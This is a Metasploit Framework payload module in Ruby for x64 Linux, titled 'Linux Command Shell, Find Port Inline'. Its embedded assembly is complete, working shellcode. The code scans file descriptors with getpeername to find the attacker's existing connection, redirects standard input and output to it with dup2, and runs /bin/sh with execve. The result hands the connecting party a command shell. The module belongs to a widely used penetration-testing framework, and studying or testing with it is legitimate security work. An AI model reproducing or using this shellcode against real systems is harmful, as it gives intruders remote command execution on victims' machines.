##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 98

  include Msf::Payload::Single
  include Msf::Payload::Linux::X64::Prepends
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell, Find Port Inline',
        'Description' => 'Spawn a shell on an established connection',
        'Author' => 'mak',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::FindPort,
        'Session' => Msf::Sessions::CommandShellUnix,
        'Payload' => {
          'Offsets' =>
                  {
                    'CPORT' => [ 39, 'n' ]
                  },

          'Assembly' => %(
            xor rdi,rdi
            xor rbx,rbx
            mov bl,0x18
            sub rsp,rbx
            lea rdx,[rsp]
            mov [rdx], 0x10
            lea rsi,[rsp+8]
          find_port:
            push 0x34     ; getpeername
            pop rax
            syscall
            inc rdi
            cmp word [rsi+2],0x4142
            jne find_port
            dec rdi
            push 2
            pop rsi
          dup2:
            push 0x21     ; dup2
            pop rax
            syscall
            dec rsi
            jns dup2
            mov rbx,rsi
            mov ebx, 0x68732f41
            mov eax,0x6e69622f
            shr rbx,8
            shl rbx,32
            or  rax,rbx
            push rax
            mov rdi,rsp
            xor rsi,rsi
            mov rdx,rsi
            push 0x3b     ; execve
            pop rax
            syscall
          )
        }
      )
    )
  end

  def size
    return 91
  end
end
